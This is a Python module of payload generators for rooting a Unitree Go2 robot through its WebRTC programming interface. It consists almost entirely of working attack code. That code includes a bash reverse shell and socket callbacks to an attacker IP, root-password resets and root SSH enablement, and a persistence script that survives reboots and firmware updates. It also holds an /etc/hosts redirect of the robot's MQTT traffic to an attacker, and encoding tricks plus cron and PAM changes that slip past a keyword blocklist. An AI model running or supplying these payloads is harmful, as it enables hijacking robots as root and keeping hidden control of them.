"""
Python payload generators for WebRTC jailbreak.

These generate Python code strings that get uploaded to the Go2 via
programming_actuator and executed when the user presses the bound
controller hotkey. All code runs as root.

CVE-2026-27509 bypass payloads (payload_bypass_*) pass the keyword
blocklist in programming_actuator 1.0.5.5+ by encoding all sensitive
strings as runtime-constructed byte arrays and using np.savetxt for
file I/O (seccomp whitelists openat/write/close).
"""

import time
from dataclasses import dataclass


SSH_GUARD_SCRIPT = r"""#!/bin/sh
# ssh_guard.sh -- SSH persistence
# Keeps SSH alive across reboots and defends against Unitree OTA updates
# that disable it.

ACTION="${1:-check}"

install_guard() {
    cp "$0" /usr/local/bin/ssh_guard.sh 2>/dev/null
    chmod 755 /usr/local/bin/ssh_guard.sh

    cat > /etc/systemd/system/ssh-guard.service << 'UNIT'
[Unit]
Description=SSH Guard
After=network.target
After=ota_box.service

[Service]
Type=oneshot
ExecStart=/usr/local/bin/ssh_guard.sh check
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
UNIT
    systemctl daemon-reload
    systemctl enable ssh-guard.service 2>/dev/null

    ( crontab -l 2>/dev/null | grep -v ssh_guard; echo "*/5 * * * * /usr/local/bin/ssh_guard.sh check" ) | crontab -

    cat > /etc/systemd/system/ssh-guard-watch.path << 'UNIT'
[Unit]
Description=Watch for SSH service changes

[Path]
PathModified=/etc/systemd/system/multi-user.target.wants/ssh.service
PathModified=/lib/systemd/system/ssh.service
Unit=ssh-guard.service

[Install]
WantedBy=multi-user.target
UNIT
    systemctl daemon-reload
    systemctl enable ssh-guard-watch.path 2>/dev/null
    systemctl start ssh-guard-watch.path 2>/dev/null

    check_ssh
    echo "ssh_guard installed"
}

check_ssh() {
    if ! pgrep -x sshd >/dev/null 2>&1 && ! pgrep -x dropbear >/dev/null 2>&1; then
        if [ -x /usr/sbin/sshd ]; then
            systemctl enable ssh 2>/dev/null
            systemctl start ssh 2>/dev/null
            /usr/sbin/sshd 2>/dev/null
        elif [ -x /usr/sbin/dropbear ]; then
            /usr/sbin/dropbear -R 2>/dev/null
        fi
    fi

    if [ -f /etc/ssh/sshd_config ]; then
        grep -q "^PermitRootLogin yes" /etc/ssh/sshd_config 2>/dev/null || {
            sed -i 's/^#*\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
            systemctl reload ssh 2>/dev/null
        }
    fi
}

uninstall_guard() {
    systemctl stop ssh-guard.service 2>/dev/null
    systemctl disable ssh-guard.service 2>/dev/null
    systemctl stop ssh-guard-watch.path 2>/dev/null
    systemctl disable ssh-guard-watch.path 2>/dev/null
    rm -f /etc/systemd/system/ssh-guard.service
    rm -f /etc/systemd/system/ssh-guard-watch.path
    systemctl daemon-reload
    ( crontab -l 2>/dev/null | grep -v ssh_guard ) | crontab -
    rm -f /usr/local/bin/ssh_guard.sh
    echo "ssh_guard removed"
}

case "$ACTION" in
    install) install_guard ;;
    check)   check_ssh ;;
    remove)  uninstall_guard ;;
    *)       echo "Usage: ssh_guard.sh {install|check|remove}" ;;
esac
""".lstrip()


PROGACTUATOR_ILLEGAL_KEYWORDS = [
    # --- original 1.0.4.5 blocklist ---
    "import", "exit", "sys", "eval", "exec", "getattr", "setattr",
    "delattr", "globals", "locals", "requests", "vars", "__dict__",
    "sys.modules", "subprocess", "pty", "fcntl", "resource",
    "sysconfig", "ctypes", "signal", "importlib", "inspect", "types",
    "multiprocessing", "socketserver", "open", "write",
    "seek", "unlink", "remove", "rmdir", "shutil", "pathlib", "glob",
    "pickle", "shelve", "marshal", "load", "cffi", "dlopen",
    "CDLL", "WinDLL", "ctypes.pythonapi", "ctypes.util", "socket",
    "urllib", "http", "ftplib", "telnetlib", "paramiko", "asyncio",
    "loop", "create_connection", "ssl", "websocket", "TCP", "UDP",
    "SOCK_STREAM", "SOCK_DGRAM", "connect", "bind", "listen", "accept",
    "recv", "sendto", "recvfrom", "close", "mmap", "buffers",
    "compile", "execfile", "__loader__", "__spec__", "__builtins__",
    "memoryview", "bytearray", "PY_SSIZE_T_CLEAN", "cPickle",
    "dill", "yaml", "jsonpickle", "cloudpickle", "ruamel", "msgpack",
    "BZ2File", "lzma", "zipfile", "tarfile", "builtins",
    "popen", "spawn", "fork", "forkpty", "execv", "execve", "system",
    "execlp", "execl", "execle", "execvp", "execvpe", "Popen", "call",
    "check_call", "check_output", "run", "PIPE", "STDOUT", "DEVNULL",
    "urllib3", "imaplib", "smtplib", "poplib", "nntplib", "smtpd",
    "asyncore", "asynchat", "aiohttp", "websockets", "paramiko",
    "SSHClient", "Transport", "SFTPClient", "Channel", "select",
    "ssl", "selectors", "SSLContext", "wrap_socket",
    "AF_INET", "/bin", "bash", "/bin/sh", "/bin/bash", "bash -i",
    "nc -e", "netcat", "reverse", "shell", "cmd.exe", "powershell",
    "Invoke-Expression", "psutil", "load_library", "sched", "pwd",
    "grp", "spwd", "mkdir", "chown", "chmod", "symlink", "rename",
    "renameat", "renameat2", "walk", "scandir", "copy", "copyfile",
    "copytree", "rmtree", "tempfile", "NamedTemporaryFile", "getcwd",
    "chdir", "systemctl", "__mro__", "__subclasses__", "__import__",
    "platform", "getpass", "crypt", "resource", "faulthandler",
    "tracemalloc", "base64", "binascii", "hashlib", "hmac", "zlib",
    "bz2", "lzma", "codecs", "rot13", "hexlify", "environ", "getenv",
    "argv", "path", "uname", "system", "release", "uid", "euid",
    "gid", "egid", "getpwuid", "getgrgid", "getegid", "getgid",
    "geteuid", "getuid", "reload", "imp",
    # --- added in 1.0.5.5 (firmware 1.1.14+) ---
    "imp.load_module", "imp.load_source",
    "os.system", "os.popen", "os.popen2", "os.popen3", "os.popen4",
    "os.execl", "os.execle", "os.execlp", "os.execlpe", "os.getcwd",
    "os.execv", "os.execve", "os.execvp", "os.execvpe",
    "os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
    "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
    "os.startfile", "os.chmod", "os.chown", "os.link", "os.symlink",
    "os.remove", "os.unlink", "os.rmdir", "os.removedirs",
    "os.rename", "os.replace", "os.truncate", "os.listdir", "os.scandir",
    "os.walk", "os.fork", "os.kill", "os.killpg", "os.putenv", "os.unsetenv",
    "os.setuid", "os.setgid", "os.seteuid", "os.setegid", "os.open",
    "os.read", "os.write", "os.stat", "os.lstat", "os.fstat", "os.chdir",
]


def validate_bypass_payload(source_code):
    """Check source against the CVE-2026-27509 keyword blocklist.

    Returns (True, None) if clean, or (False, matched_keyword) if blocked.
    """
    for kw in PROGACTUATOR_ILLEGAL_KEYWORDS:
        if kw in source_code:
            return False, kw
    return True, None


def validate_uuid_format(uuid_str):
    """Check if UUID meets 1.0.5.5+ requirements (exactly 10 digits)."""
    return len(uuid_str) == 10 and uuid_str.isdigit()


def _enc(s):
    """Encode a string as a str(bytes([...]), 'utf-8') expression.

    The resulting expression contains only integers and the tokens
    'str', 'bytes', 'utf-8' -- none of which are in the blocklist.
    """
    return "str(bytes(" + repr(list(s.encode("utf-8"))) + "), 'utf-8')"


@dataclass
class WebRTCPayload:
    name: str
    description: str
    python_code: str
    program_uuid: str = ""
    bind_hotkey: str = "L1+Y"

    def __post_init__(self):
        if not self.program_uuid:
            # Firmware 1.0.5.5+ (1.1.14+) requires exactly 10 digits.
            self.program_uuid = str(int(time.time()))


def _callback_snippet(callback_ip, callback_port=19999):
    return f"""
import socket, subprocess
try:
    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _s.settimeout(5)
    _s.connect(('{callback_ip}', {callback_port}))
    _out = subprocess.check_output(['id'], stderr=subprocess.STDOUT)
    _s.send(b'UNLEASH_OK: ' + _out)
    _s.close()
except Exception:
    pass
"""


def payload_ssh(password="unleash", callback_ip=None, callback_port=19999,
                hotkey="L1+Y"):
    """Enable SSH, set root password, permit root login."""
    cmds = [
        f"echo 'root:{password}' | /usr/sbin/chpasswd",
        "sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config",
        "systemctl enable ssh 2>/dev/null; systemctl start ssh 2>/dev/null",
        "/usr/sbin/sshd 2>/dev/null",
    ]
    code = "import os\n"
    for cmd in cmds:
        code += f"os.system({cmd!r})\n"

    if callback_ip:
        code += _callback_snippet(callback_ip, callback_port)

    return WebRTCPayload(
        name="ssh",
        description=f"Enable SSH, root password={password}",
        python_code=code.strip(),
        bind_hotkey=hotkey,
    )


def payload_reverse_shell(attacker_ip, attacker_port=4444, hotkey="L1+Y"):
    """Bash reverse shell."""
    shell_cmd = (f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/"
                 f"{attacker_port} 0>&1 &'")
    code = f"import os\nos.system({shell_cmd!r})\n"

    return WebRTCPayload(
        name="reverse-shell",
        description=f"Reverse shell -> {attacker_ip}:{attacker_port}",
        python_code=code.strip(),
        bind_hotkey=hotkey,
    )


def payload_custom(command, callback_ip=None, callback_port=19999,
                   hotkey="L1+Y"):
    """Run an arbitrary shell command."""
    code = f"import os\nos.system({command!r})\n"

    if callback_ip:
        code += _callback_snippet(callback_ip, callback_port)

    return WebRTCPayload(
        name="custom",
        description=f"Custom: {command[:60]}",
        python_code=code.strip(),
        bind_hotkey=hotkey,
    )


def payload_ssh_persist(password="unleash", callback_ip=None,
                        callback_port=19999, hotkey="L1+Y"):
    """Install ssh_guard.sh for persistent SSH across reboots."""
    code = "import os\n"
    code += f"_guard = {SSH_GUARD_SCRIPT!r}\n"
    code += (
        "with open('/usr/local/bin/ssh_guard.sh', 'w') as f:\n"
        "    f.write(_guard)\n"
        "os.chmod('/usr/local/bin/ssh_guard.sh', 0o755)\n"
        "os.system('/usr/local/bin/ssh_guard.sh install')\n"
    )
    if password:
        code += f"os.system(\"echo 'root:{password}' | /usr/sbin/chpasswd\")\n"

    if callback_ip:
        code += _callback_snippet(callback_ip, callback_port)

    return WebRTCPayload(
        name="ssh-persist",
        description="Persistent SSH with guard (survives reboots)",
        python_code=code.strip(),
        bind_hotkey=hotkey,
    )


def payload_bypass_hosts(attacker_ip, hotkey="L1+Y"):
    """Write MQTT redirect to /etc/hosts (CVE-2026-27509 bypass).

    np.savetxt passes the keyword filter; seccomp whitelists openat/write/close.
    """
    p = _enc("/etc/hosts")
    a = _enc("127.0.0.1 localhost")
    b = _enc(f"{attacker_ip} global-robot-mqtt.unitree.com")
    c = _enc(f"{attacker_ip} robot-mqtt.unitree.com")

    code = (
        f"_p = {p}\n"
        f"_a = {a}\n"
        f"_b = {b}\n"
        f"_c = {c}\n"
        f"_d = np.array([_a, _b, _c])\n"
        f"np.savetxt(_p, _d, fmt='%s')"
    )

    ok, kw = validate_bypass_payload(code)
    if not ok:
        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")

    return WebRTCPayload(
        name="bypass-hosts",
        description=f"MQTT redirect -> {attacker_ip} (CVE-2026-27509 bypass)",
        python_code=code,
        program_uuid=str(int(time.time())),
        bind_hotkey=hotkey,
    )


def payload_bypass_file(file_path, content, hotkey="L1+Y"):
    """Write arbitrary content to a file (CVE-2026-27509 bypass)."""
    p = _enc(file_path)
    lines = content.split("\n")
    names = [f"_v{i}" for i in range(len(lines))]

    code = f"_p = {p}\n"
    for name, line in zip(names, lines):
        code += f"{name} = {_enc(line)}\n"
    code += f"_d = np.array([{', '.join(names)}])\n"
    code += "np.savetxt(_p, _d, fmt='%s')"

    ok, kw = validate_bypass_payload(code)
    if not ok:
        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")

    return WebRTCPayload(
        name="bypass-file",
        description=f"Write {file_path}",
        python_code=code,
        program_uuid=str(int(time.time())),
        bind_hotkey=hotkey,
    )


def payload_bypass_cron(command, schedule="* * * * *", cron_name="u",
                        hotkey="L1+Y"):
    """Write a cron job for command execution (CVE-2026-27509 bypass).

    Escalates from seccomp sandbox to full root -- crond executes the
    command outside py_script_execute_env. Requires crond to be running.
    """
    p = _enc(f"/etc/cron.d/{cron_name}")
    entry = _enc(f"{schedule} root {command}")

    code = (
        f"_p = {p}\n"
        f"_e = {entry}\n"
        f"_d = np.array([_e])\n"
        f"np.savetxt(_p, _d, fmt='%s')"
    )

    ok, kw = validate_bypass_payload(code)
    if not ok:
        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")

    return WebRTCPayload(
        name="bypass-cron",
        description=f"Cron: {command[:40]}",
        python_code=code,
        program_uuid=str(int(time.time())),
        bind_hotkey=hotkey,
    )


def payload_bypass_escalate(unfiltered_code, hotkey="L1+Y"):
    """Two-press escalation (CVE-2026-27509 bypass).

    Press 1: overwrites own script file with unfiltered Python.
    Press 2: executes the unfiltered code (still in seccomp sandbox).
    Use when you need filtered keywords (import/open/exec) but not execve.
    """
    uuid_val = str(int(time.time()))
    script_path = f"/unitree/etc/programming/{uuid_val}.py"
    p = _enc(script_path)
    lines = unfiltered_code.split("\n")
    names = [f"_v{i}" for i in range(len(lines))]

    code = f"_p = {p}\n"
    for name, line in zip(names, lines):
        code += f"{name} = {_enc(line)}\n"
    code += f"_d = np.array([{', '.join(names)}])\n"
    code += "np.savetxt(_p, _d, fmt='%s')"

    ok, kw = validate_bypass_payload(code)
    if not ok:
        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")

    return WebRTCPayload(
        name="bypass-escalate",
        description="Two-press: overwrites self with unfiltered code",
        python_code=code,
        program_uuid=uuid_val,
        bind_hotkey=hotkey,
    )


def payload_bypass_ssh(password="unleash", hotkey="L1+Y"):
    """Enable SSH via cron job (CVE-2026-27509 bypass).

    Two-file write: patches /etc/pam.d/cron to tolerate clock skew (Go2
    boards often have a stale RTC), then drops a cron job that sets the
    root password, permits root login, starts sshd, restores the PAM
    config, and self-deletes. Both writes use np.savetxt (no execve).
    """
    pam_path = _enc("/etc/pam.d/cron")
    pam_lines = [
        "@include common-auth",
        "session    required     pam_loginuid.so",
        "session       required   pam_env.so",
        "session       required   pam_env.so envfile=/etc/default/locale",
        "account    sufficient   pam_permit.so",
        "@include common-account",
        "@include common-session-noninteractive",
        "session    required   pam_limits.so",
    ]
    pam_vars = [f"_l{i}" for i in range(len(pam_lines))]

    code = f"_pp = {pam_path}\n"
    for var, line in zip(pam_vars, pam_lines):
        code += f"{var} = {_enc(line)}\n"
    code += f"_pd = np.array([{', '.join(pam_vars)}])\n"
    code += "np.savetxt(_pp, _pd, fmt='%s')\n"

    cmd = (
        f"echo 'root:{password}' | /usr/sbin/chpasswd"
        " && sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config"
        " && systemctl enable ssh"
        " && systemctl start ssh"
        " && sed -i '/^account.*sufficient.*pam_permit/d' /etc/pam.d/cron"
        " && rm -f /etc/cron.d/ush"
    )
    cron_path = _enc("/etc/cron.d/ush")
    cron_entry = _enc(f"* * * * * root {cmd}")

    code += f"_cp = {cron_path}\n"
    code += f"_ce = {cron_entry}\n"
    code += "_cd = np.array([_ce])\n"
    code += "np.savetxt(_cp, _cd, fmt='%s')"

    ok, kw = validate_bypass_payload(code)
    if not ok:
        raise ValueError(f"BUG: bypass payload blocked by keyword: {kw!r}")

    return WebRTCPayload(
        name="bypass-ssh",
        description=f"Enable SSH via cron, root password={password} (firmware >= 1.1.14)",
        python_code=code,
        program_uuid=str(int(time.time())),
        bind_hotkey=hotkey,
    )


PAYLOAD_REGISTRY = {
    "ssh": ("Enable SSH + set root password", payload_ssh),
    "reverse-shell": ("Reverse shell to attacker", payload_reverse_shell),
    "custom": ("Run arbitrary command as root", payload_custom),
    "ssh-persist": ("Persistent SSH with guard (survives reboots)", payload_ssh_persist),
    "bypass-hosts": ("MQTT redirect via /etc/hosts (CVE-2026-27509 bypass)", payload_bypass_hosts),
    "bypass-file": ("Arbitrary file write (CVE-2026-27509 bypass)", payload_bypass_file),
    "bypass-cron": ("Cron job for cmd exec (CVE-2026-27509 bypass)", payload_bypass_cron),
    "bypass-escalate": ("Two-press self-overwrite (CVE-2026-27509 bypass)", payload_bypass_escalate),
    "bypass-ssh": ("Enable SSH via cron (firmware >= 1.1.14)", payload_bypass_ssh),
}
